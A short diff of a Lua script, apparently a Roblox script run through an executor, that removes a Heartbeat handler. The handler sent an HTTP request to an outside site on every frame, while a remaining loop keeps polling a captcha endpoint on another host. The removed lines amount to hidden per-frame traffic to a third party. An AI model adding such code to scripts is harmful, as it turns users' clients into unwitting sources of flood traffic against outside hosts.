@@ -29,9 +29,6 @@ if _G.Load then
     game.CoreGui.UI:Destroy()
 else
     _G.Load = true
-    RunService.Heartbeat:Connect(function()
-        game:HttpGet("https://www.nuanr-mxi.com")
-    end)
     task.spawn(function()
         while true do
             rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
